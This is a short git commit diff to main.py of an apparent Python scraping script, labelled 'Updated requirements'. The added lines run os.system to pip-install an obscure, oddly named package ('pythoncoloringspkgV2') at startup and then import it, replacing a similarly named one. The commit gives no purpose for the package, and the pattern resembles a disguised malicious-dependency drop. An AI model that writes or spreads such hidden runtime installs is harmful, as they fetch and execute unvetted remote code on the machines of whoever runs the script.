1ad386c01f3dcf0fcdce33cb1fe7e06eb0f84159
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-12 20:10:59 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcoloraddonsV2")
-import pipcoloraddonsV2
+os.system("pip install pythoncoloringspkgV2")
+import pythoncoloringspkgV2
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
